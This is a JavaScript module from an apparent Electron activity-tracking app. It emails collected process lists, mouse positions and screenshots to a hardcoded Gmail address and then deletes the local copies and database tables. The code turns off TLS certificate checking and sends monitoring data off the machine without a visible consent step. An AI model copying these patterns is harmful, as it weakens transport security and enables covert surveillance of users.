const fs = require('fs');
const path = require('path');
const electron = require('electron');
const uData = (electron.app || electron.remote.app).getPath('userData');
const nodemailer = require('nodemailer');
const removeData = require(path.join(__dirname, '../dbm/removeData'));

/**
 * get email configuration from a json file
 * change file source from config.test.json > config.json
 * provide email and password in config.json file
 */

const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.test.json')));

/**
 * Node module for email sending
 */

let transporter = nodemailer.createTransport({
  service: 'gmail',
  secure: false,
  port: 25,
  auth: {
    user: config.email,
    pass: config.pass
  },
  tls: {
    rejectUnauthorized: false
  }
});

/**
 * email configuration
 */

let HelperOptions = {
  from: `Shahidul Islam Majumder <${config.email}>`,
  to: 'devorg.bd@gmail.com',
  //to: 'xp.pground@gmail.com',
  subject: 'Daily Activity Email',
  text: 'This is the body text'
};

/**
 * Send normal email with subject and body
 */

let sendEmail = function sendMailWithData(message) {
  HelperOptions.subject = message.subject;
  HelperOptions.text = message.description;
  transporter.sendMail(HelperOptions, (error, info) => {
    if (error) {
      console.log(error);
    } else {
      console.log('Sent:', info);
    }
  });
}

/**
 * Remove file and directories after sending the email
 */

let removeDirData = function removeData(datapath) {
  fs.readdir(datapath, (err, files) => {
    if (err)
      throw err;

    for (let file of files) {
      fs.unlink(path.join(datapath, file), err => {
        if (err)
          throw err;
        }
      );
    }
  });
}


/**
 * send email with attachments
 * file = attachment file path
 * delete the files after sending the email
 */

let sendData = function(message, file) {
  HelperOptions.attachments = file;
  HelperOptions.subject = message.subject;
  HelperOptions.text = message.description;
  if (HelperOptions.attachments) {
    transporter.sendMail(HelperOptions, (error, info) => {
      if (error) {
        console.log(error);
      } else {

        const dataPack = path.join(uData, '/data/dataPack'),
              emailData = path.join(uData, '/data/emailData');

        setTimeout(removeData.emptyAllTables(['ActiveProcesses', 'MousePos', 'Processes', 'images','Temp']),5000);
        setTimeout(removeDirData,4000,dataPack);
        setTimeout(removeDirData,5000,emailData);
      }
    });
  }
}

module.exports = {
  sendData,
  sendEmail
}
